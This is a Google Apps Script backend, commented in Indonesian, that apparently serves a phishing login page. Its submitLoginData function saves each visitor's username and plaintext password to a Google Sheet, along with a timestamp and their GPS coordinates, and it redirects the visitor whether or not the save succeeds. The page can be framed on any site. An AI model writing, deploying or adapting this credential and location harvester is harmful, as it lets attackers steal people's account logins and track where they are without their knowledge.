// Google Apps Script Code (Code.gs)
// Database : https://docs.google.com/spreadsheets/d/1J_IvQMhU2e_ibtRmSkkQNYndb5RpIHFsl_Sh4MuL39I/edit?usp=sharing

function doGet() {
  return HtmlService.createTemplateFromFile('Frontend')
    .evaluate()
    .setXFrameOptionsMode(HtmlService.XFrameOptionsMode.ALLOWALL)
    .addMetaTag('viewport', 'width=device-width, initial-scale=1.0');
}

function submitLoginData(formData) {
  try {
    // ID Spreadsheet dari URL yang diberikan
    const SPREADSHEET_ID = '1J_IvQMhU2e_ibtRmSkkQNYndb5RpIHFsl_Sh4MuL39I';
    
    // Buka spreadsheet
    const spreadsheet = SpreadsheetApp.openById(SPREADSHEET_ID);
    
    // Pilih Sheet_Advanced (bukan activeSheet)
    let sheet;
    try {
      sheet = spreadsheet.getSheetByName('Sheet_Advanced');
      if (!sheet) {
        // Jika Sheet_Advanced tidak ada, buat sheet baru
        sheet = spreadsheet.insertSheet('Sheet_Advanced');
      }
    } catch (error) {
      // Fallback: buat sheet baru jika ada error
      sheet = spreadsheet.insertSheet('Sheet_Advanced');
    }
    
    // Cek apakah header sudah ada
    const lastRow = sheet.getLastRow();
    
    // Jika sheet kosong atau baris pertama tidak ada header
    if (lastRow === 0 || sheet.getRange('A1').getValue() !== 'Username') {
      sheet.getRange('A1').setValue('Username');
      sheet.getRange('B1').setValue('Password');
      sheet.getRange('C1').setValue('Timestamp');
      sheet.getRange('D1').setValue('Google Maps Location');
      sheet.getRange('E1').setValue('Location Real'); // Header untuk koordinat lat/lng
    }
    
    // Cari baris kosong berikutnya
    const nextRow = sheet.getLastRow() + 1;
    
    // Masukkan data ke spreadsheet
    sheet.getRange(nextRow, 1).setValue(formData.username); // Kolom A
    sheet.getRange(nextRow, 2).setValue(formData.password); // Kolom B
    sheet.getRange(nextRow, 3).setValue(new Date()); // Kolom C - Timestamp
    
    // Selalu ambil lokasi untuk keamanan tingkat tinggi
    if (formData.location) {
      // Kolom D - Google Maps URL
      const googleMapsUrl = `https://www.google.com/maps?q=${formData.location.latitude},${formData.location.longitude}`;
      sheet.getRange(nextRow, 4).setValue(googleMapsUrl);
      
      // Kolom E - Location Real dalam format Latitude,Longitude
      const locationReal = `${formData.location.latitude},${formData.location.longitude}`;
      sheet.getRange(nextRow, 5).setValue(locationReal);
    } else {
      // Jika tidak ada lokasi, tetap isi dengan nilai default untuk keamanan
      sheet.getRange(nextRow, 4).setValue('Location not available');
      sheet.getRange(nextRow, 5).setValue('Coordinates not available');
    }
    
    // Flush changes to make sure data is saved
    SpreadsheetApp.flush();
    
    // Log untuk debugging
    console.log('Data saved successfully at row:', nextRow);
    console.log('Username:', formData.username);
    console.log('Password length:', formData.password.length);
    console.log('Location:', formData.location);
    
    // Return success response
    return {
      success: true,
      message: 'Data berhasil disimpan',
      row: nextRow,
      redirect: true
    };
    
  } catch (error) {
    console.error('Error saving data:', error);
    
    // Return error response tapi tetap izinkan redirect
    return {
      success: false,
      message: 'Gagal menyimpan data: ' + error.toString(),
      redirect: true // Tetap redirect meskipun error
    };
  }
}

// Fungsi untuk include file HTML (jika diperlukan)
function include(filename) {
  return HtmlService.createHtmlOutputFromFile(filename).getContent();
}